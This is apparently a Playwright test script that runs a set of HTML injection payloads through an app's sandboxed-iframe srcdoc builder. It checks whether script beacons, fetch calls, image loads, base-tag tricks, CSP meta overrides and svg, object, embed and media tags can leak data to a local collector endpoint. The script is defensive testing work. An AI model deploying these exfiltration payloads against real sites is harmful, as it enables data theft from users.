import http from 'node:http';
import dgram from 'node:dgram';
import { createRequire } from 'node:module';
const require = createRequire('/home/uni/Code/uni-app-contract/package.json');
const { chromium } = require('@playwright/test');
const { buildSrcdoc: __b } = await import('../../src/interface/srcdoc.ts'); const { FRAME_KIT } = await import('../../src/interface/kits/frameKit.ts'); const buildSrcdoc = (h) => __b(h, { kitSource: FRAME_KIT, headExtra: '' });

let hostBody='';
const hostSrv = http.createServer((q,r)=>{r.writeHead(200,process.env.PCSP?{'content-type':'text/html','content-security-policy':process.env.PCSP}:{'content-type':'text/html'});r.end(hostBody)}).listen(1437);
const hits = [];
const leak = http.createServer((req, res) => { hits.push(req.url); res.writeHead(200, {'content-type':'text/html','access-control-allow-origin':'*'}); res.end('<script>parent.postMessage("data-doc-loaded","*")</script>ok'); }).listen(1436);
const udp = dgram.createSocket('udp4'); const udpHits = []; udp.on('message', (m) => udpHits.push(m.toString('latin1'))); udp.bind(1438, '127.0.0.1');

const atk = `<script>navigator.sendBeacon('http://127.0.0.1:1436/leak?beacon=SHAPE','x');new Image().src='http://127.0.0.1:1436/leak?img=SHAPE';fetch('http://127.0.0.1:1436/leak?fetch=SHAPE',{mode:'no-cors'}).catch(()=>0)</script>`;
const cases = {
  plain: atk,
  comment: `<!-- lead -->\n<!-- two -->${atk}`,
  doctypeWs: `  \n\t<!DOCTYPE   html >${atk}`,
  bom: `\uFEFF<!doctype html>${atk}`,
  upper: `<HTML><HEAD>${atk}</HEAD><BODY></BODY></HTML>`,
  scriptBeforeHtml: `${atk}<html><head></head></html>`,
  injectedHead: `</head><head></head><html>${atk}`,
  baseTag: `<base href="http://127.0.0.1:1436/">${atk}<img src="rel?baseimg=SHAPE">`,
  metaInBody: `<body><meta http-equiv="Content-Security-Policy" content="default-src *">${atk}</body>`,
  xml: `<?xml version="1.0"?>${atk}`,
  frameset: `<frameset><frame src="http://127.0.0.1:1436/leak?frame=SHAPE"></frameset>${atk}`,
  svg: `<svg onload="fetch('http://127.0.0.1:1436/leak?svg=SHAPE',{mode:'no-cors'})"></svg><object data="http://127.0.0.1:1436/leak?obj=SHAPE"></object><embed src="http://127.0.0.1:1436/leak?embed=SHAPE"><link rel=stylesheet href="http://127.0.0.1:1436/leak?css=SHAPE"><video poster="http://127.0.0.1:1436/leak?poster=SHAPE"></video><audio src="http://127.0.0.1:1436/leak?audio=SHAPE" autoplay></audio>`,
};
const browser = await chromium.launch();
const page = await browser.newPage();
page.on('console', () => {});
const results = {};
for (const [name, body] of Object.entries(cases)) {
  hits.length = 0; udpHits.length = 0;
  const html = process.env.NOCSP ? body : buildSrcdoc(body);
  const host = `<!doctype html><body><iframe sandbox="allow-scripts" id=f></iframe><script>document.getElementById('f').srcdoc=${JSON.stringify(html).replace(/</g,"\\u003c")}</script>`;
  hostBody=host;
  await page.goto('http://127.0.0.1:1437/');
  await page.waitForTimeout(2500);
  results[name] = { http: [...hits], udp: udpHits.length, udpHasSecret: udpHits.some(x=>x.includes('SECRETUSER')), url: page.url() };
}
console.log(JSON.stringify(results, null, 1));
await browser.close(); leak.close(); hostSrv.close(); udp.close();
